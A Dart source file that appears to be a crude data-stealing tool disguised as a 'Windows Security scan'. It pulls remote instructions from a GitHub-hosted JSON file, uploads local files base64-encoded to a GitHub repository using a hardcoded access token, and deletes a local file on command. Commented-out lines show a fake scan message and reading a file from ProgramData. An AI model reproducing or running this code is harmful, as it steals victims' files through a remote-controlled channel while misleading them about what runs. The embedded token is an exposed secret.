import 'package:cli/cli.dart' as cli;
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:io';

import 'prop.dart';

void main(List<String> arguments) {
  // var time = DateTime.now();
  // // print('Windows© Security scan 2020');
  // // print('Please wait.');
  // // print('Please wait.......');
  // // print('Please wait..this window close automaticaly');
  // var myFile = new File('C:\\ProgramData\\dat.txt').readAsBytesSync();
  // String s = new String.fromCharCodes(myFile);
  // // var pic = new File('G:\\New folder\\cli\\bin\\1.png').readAsBytesSync();
  // //var pic1 = base64.encode(pic);
  // //print(pic1);

  // //gitaction('$time', pic);
  cfg();
  //upprop();
  //getfile('G:\\New folder\\cli\\bin\\1.png');
}

Future<void> gitaction(filename, content) async {
  // C:\AndroidInstall_530.log
  var str = "$content";
  var bytes = utf8.encode(str);
  var base64Str = base64.encode(bytes);

  var headers = {
    'Authorization': 'token b5b151ab959cba952e21113be9ebef116ac70fa6',
    'Content-Type': 'application/json',
  };
  var data =
      '{ "path": "21", "message": "Initial Commit", "committer": { "name": "123", "email": "44" }, "content": "$base64Str", "branch": "master", "sha": "" }';
  var res = await http.put(
      'https://api.github.com/repos/TSCSOftware/api1/contents/t1/$filename',
      headers: headers,
      body: data);
  var jsonData = json.decode(res.body);
  //print('datdatda${res.body}');
  if (res.statusCode != 200) {
  } else {}
}

Future<void> cfg() async {
  int code;
  var data = await http.get(
      "https://raw.githubusercontent.com/TSCSOftware/api1/master/t1/1.json");

  var u = json.decode(data.body);
  code = u['code'];
  String upath = u['upath'];
  print(upath);
  if (upath == null) {
  } else {
    getfile(upath);
  }
  if (code == 1) {
    deleteFile();
  }
}

Future<void> deleteFile() async {
  var file = File('G:\\New folder\\cli\\bin\\1.json');
  await file.delete();
}
